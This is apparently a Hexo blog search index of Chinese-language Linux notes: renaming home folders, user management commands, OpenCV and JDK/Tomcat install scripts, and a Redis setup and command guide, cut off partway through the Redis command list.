<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>linux ubuntu中家目录中文改英文.md</title>
      <link href="/2019/12/03/deploy/linux/linux%20ubuntu%E4%B8%AD%E5%AE%B6%E7%9B%AE%E5%BD%95%E4%B8%AD%E6%96%87%E6%94%B9%E8%8B%B1%E6%96%87/"/>
      <url>/2019/12/03/deploy/linux/linux%20ubuntu%E4%B8%AD%E5%AE%B6%E7%9B%AE%E5%BD%95%E4%B8%AD%E6%96%87%E6%94%B9%E8%8B%B1%E6%96%87/</url>
      
        <content type="html"><![CDATA[<ol><li>先将home目录下系统默认的文件夹名称改为英文，手动操作，也可以参考以下脚本<pre><code class="bash">name=`whoami`;#echo $name#可以将第二步骤的内容保存到文件中，命名user-dirs.dirs，打开下面一句的注释，执行该脚本。#我忘记这个命令能不能生效了，暂时没有时间重新测试#cp /home/$name/linux/config/user-dirs.dirs /home/$name/.config/user-dirs.dirs;echo user-dirs.dirs 复制完成;mv /home/$name/图片 /home/$name/Pictures;mv /home/$name/桌面 /home/$name/Desktop;mv /home/$name/下载 /home/$name/Downloads;mv /home/$name/模板 /home/$name/Templates;mv /home/$name/公共的 /home/$name/Public;mv /home/$name/文档 /home/$name/Documents;mv /home/$name/音乐 /home/$name/Music;mv /home/$name/视频 /home/$name/Videos;echo home文件夹重命名完成;</code></pre></li></ol><pre><code>2. 进入~/.config/user-dirs.dirs，将里面的内容改为如下,其中的英文要与你文件夹的名称对应</code></pre><h1 id="This-file-is-written-by-xdg-user-dirs-update"><a href="#This-file-is-written-by-xdg-user-dirs-update" class="headerlink" title="This file is written by xdg-user-dirs-update"></a>This file is written by xdg-user-dirs-update</h1><h1 id="If-you-want-to-change-or-add-directories-just-edit-the-line-you’re"><a href="#If-you-want-to-change-or-add-directories-just-edit-the-line-you’re" class="headerlink" title="If you want to change or add directories, just edit the line you’re"></a>If you want to change or add directories, just edit the line you’re</h1><h1 id="interested-in-All-local-changes-will-be-retained-on-the-next-run"><a href="#interested-in-All-local-changes-will-be-retained-on-the-next-run" class="headerlink" title="interested in. All local changes will be retained on the next run"></a>interested in. All local changes will be retained on the next run</h1><h1 id="Format-is-XDG-xxx-DIR-”-HOME-yyy”-where-yyy-is-a-shell-escaped"><a href="#Format-is-XDG-xxx-DIR-”-HOME-yyy”-where-yyy-is-a-shell-escaped" class="headerlink" title="Format is XDG_xxx_DIR=”$HOME/yyy”, where yyy is a shell-escaped"></a>Format is XDG_xxx_DIR=”$HOME/yyy”, where yyy is a shell-escaped</h1><h1 id="homedir-relative-path-or-XDG-xxx-DIR-”-yyy”-where-yyy-is-an"><a href="#homedir-relative-path-or-XDG-xxx-DIR-”-yyy”-where-yyy-is-an" class="headerlink" title="homedir-relative path, or XDG_xxx_DIR=”/yyy”, where /yyy is an"></a>homedir-relative path, or XDG_xxx_DIR=”/yyy”, where /yyy is an</h1><h1 id="absolute-path-No-other-format-is-supported"><a href="#absolute-path-No-other-format-is-supported" class="headerlink" title="absolute path. No other format is supported."></a>absolute path. No other format is supported.</h1><p>#<br>XDG_DESKTOP_DIR=”$HOME/Desktop”<br>XDG_DOWNLOAD_DIR=”$HOME/Downloads”<br>XDG_TEMPLATES_DIR=”$HOME/Templates”<br>XDG_PUBLICSHARE_DIR=”$HOME/Public”<br>XDG_DOCUMENTS_DIR=”$HOME/Documents”<br>XDG_MUSIC_DIR=”$HOME/Music”<br>XDG_PICTURES_DIR=”$HOME/Pictures”<br>XDG_VIDEOS_DIR=”$HOME/Videos”</p><pre><code>3. 重启或者注销，应该就能生效了</code></pre>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>linux adduser.md</title>
      <link href="/2019/12/03/deploy/linux/cmd/linux%20adduser/"/>
      <url>/2019/12/03/deploy/linux/cmd/linux%20adduser/</url>
      
        <content type="html"><![CDATA[<h3 id="useradd与adduser"><a href="#useradd与adduser" class="headerlink" title="useradd与adduser"></a>useradd与adduser</h3><h4 id="centos"><a href="#centos" class="headerlink" title="centos:"></a>centos:</h4><p>useradd与adduser是没有区别的都是在创建用户，在home下自动创建目录，没有设置密码，需要使用passwd命令修改密码。</p><h4 id="ubuntu"><a href="#ubuntu" class="headerlink" title="ubuntu:"></a>ubuntu:</h4><ul><li>adduser: 会在/home下自动创建与用户名同名的用户目录，系统shell版本，会在创建时会提示输入密码，更加友好。</li><li>useradd: 不会在/home下自动创建与用户名同名的用户目录，而且不会自动选择shell版本，也没有设置密码，那么这个用户是不能登录的，需要使用passwd命令修改密码。<ul><li>-d： 指定用户的主目录</li><li>-m： 如果存在不再创建，但是此目录并不属于新创建用户；如果主目录不存在，则强制创建； -m和-d一块使用。</li><li>-s： 指定用户登录时的shell版本</li><li>-M： 不创建主目录</li></ul></li></ul><h5 id="指定密码"><a href="#指定密码" class="headerlink" title="指定密码"></a>指定密码</h5><pre><code>passwd username</code></pre><h3 id="userdel"><a href="#userdel" class="headerlink" title="userdel"></a>userdel</h3><ul><li>userdel username: 删除用户，只能删除用户</li><li>userdel -r username: 可以删除用户及相关目录。</li></ul>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
          <category> cmd </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>linux opencv.md</title>
      <link href="/2019/12/03/deploy/linux/linux%20opencv/"/>
      <url>/2019/12/03/deploy/linux/linux%20opencv/</url>
      
        <content type="html"><![CDATA[<pre><code class="bash">#!/bin/bash# 在腾讯云ubuntu16 64位，测试通过#建议使用普通用户账号进行安装# 准备sudo apt updatesudo echo y | sudo apt install python-pippython -m pip install -U pipsudo echo y | apt install unzipsudo echo y | apt install ipython# 安装编译工具sudo echo y | apt install build-essential# 安装依赖包sudo echo y | sudo apt install cmake git libgtk2.0-dev pkg-config libavcodec-dev libavformat-dev libswscale-dev# 安装可选包sudo echo y | sudo apt install python-dev python-numpy libtbb2 libtbb-dev libjpeg-dev libpng-dev libtiff-dev libjasper-dev libdc1394-22-dev# 下载 opencv 包，这里是当前的 2.4 的包# wget https://github.com/opencv/opencv/archive/2.4.13.4.zip# 解压# unzip 2.4.13.4.zip# 进入目录# cd opencv-2.4.13.4/# 下载 opencv 包，这里是当前的 3.0 的包wget https://github.com/opencv/opencv/archive/3.3.1.zip# 解压unzip 3.3.1.zip# 进入目录cd opencv-3.3.1/# 新建一个文件夹用于存放临时文件mkdir release# 切换到该临时文件夹：cd release# 腾讯云，这个可以。有些时候需要配置 python 包的搜索路径，自己用的时候可以不用配置，以后有需要了在可修改脚本cmake -D CMAKE_BUILD_TYPE=RELEASE -D CMAKE_INSTALL_PREFIX=/usr/local ..# 下面是树莓派的时候使用# cmake -D CMAKE_BUILD_TYPE=RELEASE -D CMAKE_INSTALL_PREFIX=/usr ..# 编译，下面的数字代表编译时候的线程数量make -j2# 安装sudo make install</code></pre>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>linux Ubuntu安装Jdk和Tomcat.md</title>
      <link href="/2019/12/03/deploy/linux/linux%20Ubuntu%E5%AE%89%E8%A3%85Jdk%E5%92%8CTomcat/"/>
      <url>/2019/12/03/deploy/linux/linux%20Ubuntu%E5%AE%89%E8%A3%85Jdk%E5%92%8CTomcat/</url>
      
        <content type="html"><![CDATA[<p><em>以后将脚本分开写</em></p><blockquote><p>之前我在Linux上运行代码时，当运行一个sh脚本的时候,出现了如下错误：<br>$’\r’: 未找到命令<br>未预期的符号 `$’{\r’’ 附近有语法错误</p></blockquote><p>解决方案：</p><pre><code class="shell">    sudo apt-get install dos2unix</code></pre><p>然后用 dos2unix命令对所有的用到的sh脚本进行转化即可<br>例子： </p><pre><code class="shell">    dos2unix hello.sh</code></pre><blockquote><p>原因：在windows系统下写了一个tomcat重启shell，然后上传到linux中，执行后报错：$’\r’: 未找到命令 : 没有那个文件或目录。网上资料搜索后，找到原因：主要原因是shell脚本是我在windows下编辑然后上传到linux系统里执行的。.sh文件的格式为dos格式。而linux只能执行格式为unix格式的脚本。</p></blockquote><h2 id="ubuntu安装jdk"><a href="#ubuntu安装jdk" class="headerlink" title="ubuntu安装jdk"></a>ubuntu安装jdk</h2><pre><code class="shell">    sudo echo y | apt-get install default-jdk</code></pre><h2 id="ubuntu安装jdk-tomcat-需要手动上传jdk和tomcat，和脚本放在一起，执行脚本"><a href="#ubuntu安装jdk-tomcat-需要手动上传jdk和tomcat，和脚本放在一起，执行脚本" class="headerlink" title="ubuntu安装jdk tomcat(需要手动上传jdk和tomcat，和脚本放在一起，执行脚本)"></a>ubuntu安装jdk tomcat(需要手动上传jdk和tomcat，和脚本放在一起，执行脚本)</h2><pre><code class="bash">#!/bin/bash# @Date:   2017-02-17 19:39:21# @Last Modified time: 2017-02-17 19:43:30#说明：请执行以下命令 ubuntu系统的系统测试成功# “. 该文件名”#路径#如果输入javac没有没有，请执行  source /etc/profiletouch ./retomcat.sh;echo &gt;&gt; ./retomcat.sh &#39;#!/bin/bash&#39;;echo &gt;&gt; ./retomcat.sh &#39;shutdowntomcat;&#39;;echo &gt;&gt; ./retomcat.sh &#39;startomcat;&#39;;path=`pwd`install_path=&quot;/usr/local/&quot;echo &quot;当前路径为：${path}&quot;index=0for tmp in `ls *.tar.gz;`;do    packages[index]=${tmp}    index=$((index+1))done#输出符合条件的包#echo ${packages[*]}echo &quot;发现${#packages[*]}个包&quot;for package in ${packages[*]};do    #获取安装目录名    install_contents_name=`tar tvf ${package} | awk -F &quot; &quot; &#39;{print $6}&#39; | sed -n &#39;1p&#39;`    #去除多余字符    install_contents_name=${install_contents_name%%/*}    #echo ${package} #输出包名    if test -d ${install_path}${install_contents_name}    then        #存在        echo &quot;${install_contents_name}已存在&quot;        continue    else        echo &quot;${install_path}${install_contents_name}不存在，正在安装${install_contents_name}...&quot;        tar -zxf ${package}        sudo mv  ${install_contents_name} ${install_path}        if [ ${install_contents_name:0:3} = &quot;jdk&quot; ]; then            sudo echo &gt;&gt; /etc/profile &quot;export JAVA_HOME=${install_path}${install_contents_name}&quot;;            sudo echo &gt;&gt; /etc/profile &#39;export JRE_HOME=$JAVA_HOME/jre&#39;;            sudo echo &gt;&gt; /etc/profile &#39;export CLASSPATH=.:$CLASSPATH:$JAVA_HOME/lib:$JRE_HOME/lib&#39;;            sudo echo &gt;&gt; /etc/profile &#39;export PATH=$PATH:$JAVA_HOME/bin:$JRE_HOME/bin&#39;;        elif [ ${install_contents_name:0:6}=&quot;apache&quot; ]; then            sudo echo &gt;&gt; /etc/profile &quot;export CATALINA_HOME=${install_path}${install_contents_name}&quot;;            sudo ln -s ${install_path}${install_contents_name}/bin/startup.sh ${install_path}/bin/startomcat;            sudo ln -s ${install_path}${install_contents_name}/bin/shutdown.sh ${install_path}/bin/shutdowntomcat;            sudo chmod 755 retomcat.sh;            sudo mv retomcat.sh ${install_path}/bin/retomcat;        fi    fidone. /etc/profile#source /etc/profile</code></pre><h2 id="自动下载jdk，tomcat进行配置"><a href="#自动下载jdk，tomcat进行配置" class="headerlink" title="自动下载jdk，tomcat进行配置"></a>自动下载jdk，tomcat进行配置</h2><pre><code class="bash">#!/bin/bash# @Date:   2017-02-17 19:39:21# @Last Modified time: 2017-02-17 19:43:30#请在root权限下运行# 建立了快捷命令如下：# 关闭：shutdowntomcat# 启动：startomcat# 重启：retomcatsudo echo y | apt-get install default-jdktouch ./retomcat.sh;echo &gt;&gt; ./retomcat.sh &#39;#!/bin/bash&#39;;echo &gt;&gt; ./retomcat.sh &#39;shutdowntomcat;&#39;;echo &gt;&gt; ./retomcat.sh &#39;startomcat;&#39;;echo &quot;下载apache-tomcat-8.5.23&quot;wget http://www-us.apache.org/dist/tomcat/tomcat-8/v8.5.23/bin/apache-tomcat-8.5.23.tar.gztar  -zxvf apache-tomcat-8.5.23.tar.gzmv apache-tomcat-8.5.23  /usr/local/apache-tomcat-8.5.23sudo ln -s /usr/local/apache-tomcat-8.5.23/bin/startup.sh /usr/local/bin/startomcat;sudo ln -s /usr/local/apache-tomcat-8.5.23/bin/shutdown.sh /usr/local/bin/shutdowntomcat;sudo chmod 755 retomcat.sh;sudo mv retomcat.sh /usr/local/bin/retomcat;</code></pre>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>linux redis.md</title>
      <link href="/2019/12/03/deploy/linux/linux%20redis/"/>
      <url>/2019/12/03/deploy/linux/linux%20redis/</url>
      
        <content type="html"><![CDATA[<p>Redis 官网：<a href="https://redis.io/" target="_blank" rel="noopener">https://redis.io/</a></p><p>Redis 在线测试：<a href="http://try.redis.io/" target="_blank" rel="noopener">http://try.redis.io/</a></p><h1 id="基本的数据结构"><a href="#基本的数据结构" class="headerlink" title="基本的数据结构"></a>基本的数据结构</h1><ul><li>String: 字符串</li><li>Hash: 散列</li><li>List: 列表</li><li>Set: 集合</li><li>Sorted Set: 有序集合</li></ul><h1 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h1><table><thead><tr><th>类型</th><th>简介</th><th>特性</th><th>场景</th></tr></thead><tbody><tr><td>String(字符串)</td><td>二进制安全</td><td>可以包含任何数据,比如jpg图片或者序列化的对象,一个键最大能存储512M</td><td>—</td></tr><tr><td>Hash(字典)</td><td>键值对集合,即编程语言中的Map类型</td><td>适合存储对象,并且可以像数据库中update一个属性一样只修改某一项属性值(Memcached中需要取出整个字符串反序列化成对象修改完再序列化存回去)</td><td>存储、读取、修改用户属性</td></tr><tr><td>List(列表)</td><td>链表(双向链表)</td><td>增删快,提供了操作某一段元素的API</td><td>1,最新消息排行等功能(比如朋友圈的时间线) 2,消息队列</td></tr><tr><td>Set(集合)</td><td>哈希表实现,元素不重复</td><td>1、添加、删除,查找的复杂度都是O(1) 2、为集合提供了求交集、并集、差集等操作</td><td>1、共同好友 2、利用唯一性,统计访问网站的所有独立ip 3、好友推荐时,根据tag求交集,大于某个阈值就可以推荐</td></tr><tr><td>Sorted Set(有序集合)</td><td>将Set中的元素增加一个权重参数score,元素按score有序排列</td><td>数据插入集合时,已经进行天然排序</td><td>1、排行榜 2、带权重的消息队列</td></tr></tbody></table><p>注意：</p><blockquote><p>Redis支持多个数据库，并且每个数据库的数据是隔离的不能共享，并且基于单机才有，如果是集群就没有数据库的概念。</p><p>Redis是一个字典结构的存储服务器，而实际上一个Redis实例提供了多个用来存储数据的字典，客户端可以指定将数据存储在哪个字典中。这与我们熟知的在一个关系数据库实例中可以创建多个数据库类似，所以可以将其中的每个字典都理解成一个独立的数据库。</p><p>每个数据库对外都是一个从0开始的递增数字命名，Redis默认支持16个数据库（可以通过配置文件支持更多，无上限），可以通过配置databases来修改这一数字。客户端与Redis建立连接后会自动选择0号数据库，不过可以随时使用SELECT命令更换数据库，如要选择1号数据库：</p><pre><code>redis&gt; SELECT 1OKredis [1] &gt; GET foo(nil)</code></pre><p>然而这些以数字命名的数据库又与我们理解的数据库有所区别。首先Redis不支持自定义数据库的名字，每个数据库都以编号命名，开发者必须自己记录哪些数据库存储了哪些数据。另外Redis也不支持为每个数据库设置不同的访问密码，所以一个客户端要么可以访问全部数据库，要么连一个数据库也没有权限访问。最重要的一点是多个数据库之间并不是完全隔离的，比如FLUSHALL命令可以清空一个Redis实例中所有数据库中的数据。综上所述，这些数据库更像是一种命名空间，而不适宜存储不同应用程序的数据。比如可以使用0号数据库存储某个应用生产环境中的数据，使用1号数据库存储测试环境中的数据，但不适宜使用0号数据库存储A应用的数据而使用1号数据库B应用的数据，不同的应用应该使用不同的Redis实例存储数据。由于Redis非常轻量级，一个空Redis实例占用的内在只有1M左右，所以不用担心多个Redis实例会额外占用很多内存。</p></blockquote><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>win： <a href="https://github.com/microsoftarchive/redis/releases" target="_blank" rel="noopener">https://github.com/microsoftarchive/redis/releases</a></p><p>启动</p><pre><code>redis-server.exe redis.windows.conf# 后面的那个 redis.windows.conf 可以省略，如果省略，会启用默认的</code></pre><p>关闭</p><pre><code>如果是用apt-get或者yum install安装的redis，可以直接通过下面的命令停止/启动/重启redis/etc/init.d/redis-server stop/etc/init.d/redis-server start/etc/init.d/redis-server restart如果是通过源码安装的redis，则可以通过redis的客户端程序redis-cli的shutdown命令来重启redisredis-cli -h 127.0.0.1 -p 6379 shutdown如果上述方式都没有成功停止redis，则可以使用终极武器 kill -9</code></pre><pre><code>另启一个 cmd 窗口，原来的不要关闭，不然就无法访问服务端了。切换到 redis 目录下运行:redis-cli.exe -h 127.0.0.1 -p 6379设置键值对:set myKey abc取出键值对:get myKey</code></pre><p>源码安装： <a href="https://redis.io/download" target="_blank" rel="noopener">https://redis.io/download</a></p><pre><code>wget http://download.redis.io/releases/redis-5.0.4.tar.gztar xzf redis-5.0.4.tar.gzcd redis-5.0.4make# make完后 redis-2.8.17目录下会出现编译后的redis服务程序redis-server,还有用于测试的客户端程序redis-cli,两个程序位于安装目录 src 目录下：下面启动redis服务cd src# 使用的是默认配置./redis-server# 通过启动参数告诉redis使用指定配置文件使用下面命令启动# redis.conf 是一个默认的配置文件。我们可以根据需要使用自己的配置文件./redis-server ../redis.conf# 使用测试客户端程序redis-cli和redis服务交互了cd src./redis-cliset foo barget foo</code></pre><p>ubuntu安装：</p><pre><code>sudo apt-get updatesudo apt-get install redis-server# 启动 Redisredis-server#查看 redis 是否启动？redis-cliping  # 打印PONG则成功安装</code></pre><h1 id="redis配置"><a href="#redis配置" class="headerlink" title="redis配置"></a>redis配置</h1><blockquote><p>Redis 的配置文件位于 Redis 安装目录下，文件名为 redis.conf(Windows 名为 redis.windows.conf)。</p></blockquote><p>查看配置</p><pre><code>你可以通过 CONFIG 命令查看或设置配置项。redis 127.0.0.1:6379&gt; CONFIG GET CONFIG_SETTING_NAME</code></pre><pre><code># 示例redis 127.0.0.1:6379&gt; CONFIG GET loglevel# 获取所有配置项redis 127.0.0.1:6379&gt; CONFIG GET loglevel</code></pre><p>编辑配置</p><p>你可以通过修改 redis.conf 文件或使用 CONFIG set 命令来修改配置。</p><pre><code>CONFIG SET 命令基本语法：redis 127.0.0.1:6379&gt; CONFIG SET CONFIG_SETTING_NAME NEW_CONFIG_VALUE</code></pre><pre><code># 实例redis 127.0.0.1:6379&gt; CONFIG SET loglevel &quot;notice&quot;</code></pre><p>部分参数说明</p><p>redis.conf 配置项说明如下：</p><ol><li>Redis默认不是以守护进程的方式运行，可以通过该配置项修改，使用yes启用守护进程</li></ol><pre><code>daemonize no</code></pre><ol start="2"><li>当Redis以守护进程方式运行时，Redis默认会把pid写入/var/run/redis.pid文件，可以通过pidfile指定</li></ol><pre><code>pidfile /var/run/redis.pid</code></pre><ol start="3"><li>指定Redis监听端口，默认端口为6379，作者在自己的一篇博文中解释了为什么选用6379作为默认端口，因为6379在手机按键上MERZ对应的号码，而MERZ取自意大利歌女Alessia Merz的名字</li></ol><pre><code>port 6379</code></pre><ol start="4"><li>绑定的主机地址</li></ol><pre><code>bind 127.0.0.1</code></pre><p>5.当 客户端闲置多长时间后关闭连接，如果指定为0，表示关闭该功能</p><pre><code>timeout 300</code></pre><ol start="6"><li>指定日志记录级别，Redis总共支持四个级别：debug、verbose、notice、warning，默认为verbose</li></ol><pre><code>loglevel verbose</code></pre><ol start="7"><li>日志记录方式，默认为标准输出，如果配置Redis为守护进程方式运行，而这里又配置为日志记录方式为标准输出，则日志将会发送给/dev/null</li></ol><pre><code>logfile stdout</code></pre><ol start="8"><li>设置数据库的数量，默认数据库为0，可以使用SELECT <dbid>命令在连接上指定数据库id</li></ol><pre><code>databases 16</code></pre><ol start="9"><li>指定在多长时间内，有多少次更新操作，就将数据同步到数据文件，可以多个条件配合</li></ol><pre><code>save &lt;seconds&gt; &lt;changes&gt;Redis默认配置文件中提供了三个条件：save 900 1save 300 10save 60 10000分别表示900秒（15分钟）内有1个更改，300秒（5分钟）内有10个更改以及60秒内有10000个更改。</code></pre><ol start="10"><li>指定存储至本地数据库时是否压缩数据，默认为yes，Redis采用LZF压缩，如果为了节省CPU时间，可以关闭该选项，但会导致数据库文件变的巨大</li></ol><pre><code>rdbcompression yes</code></pre><ol start="11"><li>指定本地数据库文件名，默认值为dump.rdb</li></ol><pre><code>dbfilename dump.rdb</code></pre><ol start="12"><li>指定本地数据库存放目录</li></ol><pre><code>dir ./</code></pre><ol start="13"><li>设置当本机为slav服务时，设置master服务的IP地址及端口，在Redis启动时，它会自动从master进行数据同步</li></ol><pre><code>slaveof &lt;masterip&gt; &lt;masterport&gt;</code></pre><ol start="14"><li>当master服务设置了密码保护时，slav服务连接master的密码</li></ol><pre><code>masterauth &lt;master-password&gt;</code></pre><ol start="15"><li>设置Redis连接密码，如果配置了连接密码，客户端在连接Redis时需要通过AUTH <password>命令提供密码，默认关闭</li></ol><pre><code>requirepass foobared</code></pre><ol start="16"><li>设置同一时间最大客户端连接数，默认无限制，Redis可以同时打开的客户端连接数为Redis进程可以打开的最大文件描述符数，如果设置 maxclients 0，表示不作限制。当客户端连接数到达限制时，Redis会关闭新的连接并向客户端返回max number of clients reached错误信息</li></ol><pre><code>maxclients 128</code></pre><ol start="17"><li>指定Redis最大内存限制，Redis在启动时会把数据加载到内存中，达到最大内存后，Redis会先尝试清除已到期或即将到期的Key，当此方法处理 后，仍然到达最大内存设置，将无法再进行写入操作，但仍然可以进行读取操作。Redis新的vm机制，会把Key存放内存，Value会存放在swap区</li></ol><pre><code>maxmemory &lt;bytes&gt;</code></pre><ol start="18"><li>指定是否在每次更新操作后进行日志记录，Redis在默认情况下是异步的把数据写入磁盘，如果不开启，可能会在断电时导致一段时间内的数据丢失。因为 redis本身同步数据文件是按上面save条件来同步的，所以有的数据会在一段时间内只存在于内存中。默认为no</li></ol><pre><code>appendonly no</code></pre><ol start="19"><li>指定更新日志文件名，默认为appendonly.aof</li></ol><pre><code>appendfilename appendonly.aof</code></pre><ol start="20"><li>指定更新日志条件，共有3个可选值：<br>no：表示等操作系统进行数据缓存同步到磁盘（快）<br>always：表示每次更新操作后手动调用fsync()将数据写到磁盘（慢，安全）<br>everysec：表示每秒同步一次（折中，默认值）</li></ol><pre><code>appendfsync everysec</code></pre><ol start="21"><li>指定是否启用虚拟内存机制，默认值为no，简单的介绍一下，VM机制将数据分页存放，由Redis将访问量较少的页即冷数据swap到磁盘上，访问多的页面由磁盘自动换出到内存中（在后面的文章我会仔细分析Redis的VM机制）</li></ol><pre><code>vm-enabled no</code></pre><ol start="22"><li>虚拟内存文件路径，默认值为/tmp/redis.swap，不可多个Redis实例共享</li></ol><pre><code>vm-swap-file /tmp/redis.swap</code></pre><ol start="23"><li>将所有大于vm-max-memory的数据存入虚拟内存,无论vm-max-memory设置多小,所有索引数据都是内存存储的(Redis的索引数据 就是keys),也就是说,当vm-max-memory设置为0的时候,其实是所有value都存在于磁盘。默认值为0</li></ol><pre><code>vm-max-memory 0</code></pre><ol start="24"><li>Redis swap文件分成了很多的page，一个对象可以保存在多个page上面，但一个page上不能被多个对象共享，vm-page-size是要根据存储的 数据大小来设定的，作者建议如果存储很多小对象，page大小最好设置为32或者64bytes；如果存储很大大对象，则可以使用更大的page，如果不 确定，就使用默认值</li></ol><pre><code>vm-page-size 32</code></pre><ol start="25"><li>设置swap文件中的page数量，由于页表（一种表示页面空闲或使用的bitmap）是在放在内存中的，，在磁盘上每8个pages将消耗1byte的内存。</li></ol><pre><code>vm-pages 134217728</code></pre><ol start="26"><li>设置访问swap文件的线程数,最好不要超过机器的核数,如果设置为0,那么所有对swap文件的操作都是串行的，可能会造成比较长时间的延迟。默认值为4</li></ol><pre><code>vm-max-threads 4</code></pre><ol start="27"><li>设置在向客户端应答时，是否把较小的包合并为一个包发送，默认为开启</li></ol><pre><code>glueoutputbuf yes</code></pre><ol start="28"><li>指定在超过一定的数量或者最大的元素超过某一临界值时，采用一种特殊的哈希算法</li></ol><pre><code>hash-max-zipmap-entries 64hash-max-zipmap-value 512</code></pre><ol start="29"><li>指定是否激活重置哈希，默认为开启（后面在介绍Redis的哈希算法时具体介绍）</li></ol><pre><code>activerehashing yes</code></pre><ol start="30"><li>指定包含其它的配置文件，可以在同一主机上多个Redis实例之间使用同一份配置文件，而同时各个实例又拥有自己的特定配置文件</li></ol><pre><code>include /path/to/local.conf</code></pre><h1 id="redis-cli"><a href="#redis-cli" class="headerlink" title="redis-cli"></a>redis-cli</h1><pre><code># 本地连接$redis-cliredis 127.0.0.1:6379&gt;# 检测 redis 服务是否启动redis 127.0.0.1:6379&gt; PINGPONG# 远程连接redis-cli -h host -p port -a password# 例redis-cli -h 127.0.0.1 -p 6379 -a &quot;mypass&quot;</code></pre><h1 id="Redis-key操作"><a href="#Redis-key操作" class="headerlink" title="Redis key操作"></a>Redis key操作</h1><p>更多命令请参考：<a href="https://redis.io/commands" target="_blank" rel="noopener">https://redis.io/commands</a></p><p>-1. SET key</p><blockquote><p>设置key值</p></blockquote><ol start="0"><li>GET key</li></ol><blockquote><p>获取key的值</p></blockquote><ol><li>DEL key</li></ol><blockquote><p>该命令用于在 key 存在时删除 key。</p></blockquote><ol start="2"><li>DUMP key </li></ol><blockquote><p>序列化给定 key ，并返回被序列化的值。</p></blockquote><ol start="3"><li>EXISTS key </li></ol><blockquote><p>检查给定 key 是否存在。</p></blockquote><ol start="4"><li>EXPIRE key seconds</li></ol><blockquote><p>为给定 key 设置过期时间，以秒计。</p></blockquote><ol start="5"><li>EXPIREAT key timestamp </li></ol><blockquote><p>EXPIREAT 的作用和 EXPIRE 类似，都用于为 key 设置过期时间。 不同在于 EXPIREAT 命令接受的时间参数是 UNIX 时间戳(unix timestamp)。</p></blockquote><ol start="6"><li>PEXPIRE key milliseconds </li></ol><blockquote><p>设置 key 的过期时间以毫秒计。</p></blockquote><ol start="7"><li>PEXPIREAT key milliseconds-timestamp </li></ol><blockquote><p>设置 key 过期时间的时间戳(unix timestamp) 以毫秒计</p></blockquote><ol start="8"><li>KEYS pattern </li></ol><blockquote><p>查找所有符合给定模式( pattern)的 key 。</p></blockquote><ol start="9"><li>MOVE key db </li></ol><blockquote><p>将当前数据库的 key 移动到给定的数据库 db 当中。</p></blockquote><ol start="10"><li>PERSIST key </li></ol><blockquote><p>移除 key 的过期时间，key 将持久保持。</p></blockquote><ol start="11"><li>PTTL key </li></ol><blockquote><p>以毫秒为单位返回 key 的剩余的过期时间。</p></blockquote><ol start="12"><li>TTL key </li></ol><blockquote><p>以秒为单位，返回给定 key 的剩余生存时间(TTL, time to live)。</p></blockquote><ol start="13"><li>RANDOMKEY </li></ol><blockquote><p>从当前数据库中随机返回一个 key 。</p></blockquote><ol start="14"><li>RENAME key newkey </li></ol><blockquote><p>修改 key 的名称</p></blockquote><ol start="15"><li>RENAMENX key newkey </li></ol><blockquote><p>仅当 newkey 不存在时，将 key 改名为 newkey 。</p></blockquote><ol start="16"><li>TYPE key </li></ol><blockquote><p>返回 key 所储存的值的类型。</p></blockquote><ol start="17"><li>MSET key value key value</li></ol><blockquote><p>设置多个key</p></blockquote><ol start="18"><li>KEYS *</li></ol><blockquote><p>查看数据库内所有key</p></blockquote><ol start="19"><li>FLUSHDB</li></ol><blockquote><p>删除当前数据库所有 key</p></blockquote><h1 id="Redis-String操作"><a href="#Redis-String操作" class="headerlink" title="Redis String操作"></a>Redis String操作</h1><ol><li>SET key value </li></ol><blockquote><p>设置指定 key 的值</p></blockquote><ol start="2"><li>GET key </li></ol><blockquote><p>获取指定 key 的值。</p></blockquote><ol start="3"><li>GETRANGE key start end </li></ol><blockquote><p>返回 key 中字符串值的子字符</p></blockquote><ol start="4"><li>GETSET key value</li></ol><blockquote><p>将给定 key 的值设为 value ，并返回 key 的旧值(old value)。</p></blockquote><ol start="5"><li>GETBIT key offset</li></ol><blockquote><p>对 key 所储存的字符串值，获取指定偏移量上的位(bit)。</p></blockquote><ol start="6"><li>MGET key1 [key2..]</li></ol><blockquote><p>获取所有(一个或多个)给定 key 的值。</p></blockquote><ol start="7"><li>SETBIT key offset value</li></ol><blockquote><p>对 key 所储存的字符串值，设置或清除指定偏移量上的位(bit)。</p></blockquote><ol start="8"><li>SETEX key seconds value</li></ol><blockquote><p>将值 value 关联到 key ，并将 key 的过期时间设为 seconds (以秒为单位)。</p></blockquote><ol start="9"><li>SETNX key value</li></ol><blockquote><p>只有在 key 不存在时设置 key 的值。</p></blockquote><ol start="10"><li>SETRANGE key offset value</li></ol><blockquote><p>用 value 参数覆写给定 key 所储存的字符串值，从偏移量 offset 开始。</p></blockquote><ol start="11"><li>STRLEN key</li></ol><blockquote><p>返回 key 所储存的字符串值的长度。</p></blockquote><ol start="12"><li>MSET key value [key value …]</li></ol><blockquote><p>同时设置一个或多个 key-value 对。</p></blockquote><ol start="13"><li>MSETNX key value [key value …] </li></ol><blockquote><p>同时设置一个或多个 key-value 对，当且仅当所有给定 key 都不存在。</p></blockquote><ol start="14"><li>PSETEX key milliseconds value</li></ol><blockquote><p>这个命令和 SETEX 命令相似，但它以毫秒为单位设置 key 的生存时间，而不是像 SETEX 命令那样，以秒为单位。</p></blockquote><ol start="15"><li>INCR key</li></ol><blockquote><p>将 key 中储存的数字值增一。</p></blockquote><ol start="16"><li>INCRBY key increment</li></ol><blockquote><p>将 key 所储存的值加上给定的增量值（increment） 。</p></blockquote><ol start="17"><li>INCRBYFLOAT key increment</li></ol><blockquote><p>将 key 所储存的值加上给定的浮点增量值（increment） 。</p></blockquote><ol start="18"><li>DECR key</li></ol><blockquote><p>将 key 中储存的数字值减一。</p></blockquote><ol start="19"><li>DECRBY key decrement</li></ol><blockquote><p>key 所储存的值减去给定的减量值（decrement） 。</p></blockquote><ol start="20"><li>APPEND key 